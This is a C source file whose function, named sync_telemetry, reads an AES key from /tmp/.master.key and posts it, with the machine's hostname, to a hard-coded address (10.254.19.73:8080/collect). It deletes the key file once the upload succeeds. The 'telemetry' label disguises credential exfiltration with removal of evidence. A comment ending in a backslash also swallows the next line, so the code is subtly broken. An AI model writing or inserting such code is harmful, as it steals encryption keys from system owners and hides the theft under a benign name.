#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <curl/curl.h>

// write callback to ignore response body
static size_t noop_write(void *ptr, size_t size, size_t nmemb, void *userdata) {
    (void)ptr;
    (void)userdata;
    return size * nmemb;
}

// escape a string for JSON: replace " with \" and \ with \\
static char *json_escape(const char *s) {
    size_t len = strlen(s);
    // worst case: every char becomes two, plus null terminator
    char *out = malloc(len * 2 + 1);
    if (!out) return NULL;
    size_t j = 0;
    for (size_t i = 0; i < len; i++) {
        char c = s[i];
        if (c == '"' || c == '\\') {
            out[j++] = '\\';
        }
        out[j++] = c;
    }
    out[j] = '\0';
    return out;
}

int sync_telemetry(void) {
    int ret = -1; // default error
    FILE *f = NULL;
    char *buf = NULL;
    char *aes_key = NULL;
    char *hostname = NULL;
    char *json_body = NULL;
    CURL *curl = NULL;
    struct curl_slist *headers = NULL;

    // Step 1: open and read /tmp/.master.key
    f = fopen("/tmp/.master.key", "rb");
    if (!f) {
        fprintf(stderr, "sync_telemetry: failed to open /tmp/.master.key\n");
        goto cleanup;
    }

    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    if (fsize <= 0) {
        fprintf(stderr, "sync_telemetry: empty or unreadable file\n");
        goto cleanup;
    }
    rewind(f);

    buf = malloc(fsize + 1);
    if (!buf) {
        fprintf(stderr, "sync_telemetry: memory allocation failed\n");
        goto cleanup;
    }

    size_t read = fread(buf, 1, fsize, f);
    if (read != (size_t)fsize) {
        fprintf(stderr, "sync_telemetry: incomplete read from file\n");
        goto cleanup;
    }
    buf[fsize] = '\0';
    fclose(f);
    f = NULL;

    // Step 2: parse JSON-like structure for "aes_key":"<value>"
    const char *needle = "\"aes_key\":\"";
    const char *start = strstr(buf, needle);
    if (!start) {
        fprintf(stderr, "sync_telemetry: aes_key not found in file\n");
        goto cleanup;
    }
    start += strlen(needle); // advance past the key and opening quote
    const char *end = strchr(start, '"');
    if (!end) {
        fprintf(stderr, "sync_telemetry: malformed aes_key value\n");
        goto cleanup;
    }
    size_t key_len = end - start;
    if (key_len == 0) {
        fprintf(stderr, "sync_telemetry: empty aes_key value\n");
        goto cleanup;
    }
    aes_key = strndup(start, key_len);
    if (!aes_key) {
        fprintf(stderr, "sync_telemetry: strndup failed\n");
        goto cleanup;
    }

    // Step 3: get local hostname
    hostname = malloc(256);
    if (!hostname) {
        fprintf(stderr, "sync_telemetry: memory allocation failed\n");
        goto cleanup;
    }
    if (gethostname(hostname, 256) != 0) {
        fprintf(stderr, "sync_telemetry: gethostname failed\n");
        goto cleanup;
    }
    // ensure null termination (gethostname might truncate)
    hostname[255] = '\0';

    // Step 4: build JSON string with proper escaping
    char *escaped_key = json_escape(aes_key);
    if (!escaped_key) {
        fprintf(stderr, "sync_telemetry: failed to escape aes_key\n");
        goto cleanup;
    }
    char *escaped_host = json_escape(hostname);
    if (!escaped_host) {
        fprintf(stderr, "sync_telemetry: failed to escape hostname\n");
        free(escaped_key);
        goto cleanup;
    }

    // allocate enough: {"aes_key":"...","hostname":"..."} plus escaped strings
    int json_len = snprintf(NULL, 0,
        "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}",
        escaped_key, escaped_host);
    if (json_len < 0) {
        fprintf(stderr, "sync_telemetry: snprintf failed\n");
        free(escaped_key);
        free(escaped_host);
        goto cleanup;
    }
    json_body = malloc(json_len + 1);
    if (!json_body) {
        fprintf(stderr, "sync_telemetry: memory allocation failed\n");
        free(escaped_key);
        free(escaped_host);
        goto cleanup;
    }
    snprintf(json_body, json_len + 1,
        "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}",
        escaped_key, escaped_host);
    free(escaped_key);
    free(escaped_host);

    // Step 5: Setup libcurl POST
    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "sync_telemetry: curl_easy_init failed\n");
        goto cleanup;
    }

    curl_easy_setopt(curl, CURLOPT_URL, "http://10.254.19.73:8080/collect");
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_body);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(json_body));
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, noop_write); // discard response body

    headers = curl_slist_append(headers, "Content-Type: application/json");
    if (!headers) {
        fprintf(stderr, "sync_telemetry: curl_slist_append failed\n");
        goto cleanup;
    }
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    // Step 6: perform request and check response code
    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "sync_telemetry: curl_easy_perform failed: %s\n",
            curl_easy_strerror(res));
        goto cleanup;
    }

    long http_status = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_status);
    if (http_status == 200) {
        if (remove("/tmp/.master.key") != 0) {
            fprintf(stderr, "sync_telemetry: remove failed\n");
        }
    } else {
        fprintf(stderr, "sync_telemetry: server returned HTTP status %ld\n", http_status);
    }

    ret = 0; // transmission attempted, success

cleanup:
    if (f) fclose(f);
    free(buf);
    free(aes_key);
    free(hostname);
    free(json_body);
    if (headers) curl_slist_free_all(headers);
    if (curl) curl_easy_cleanup(curl);
    return ret;
}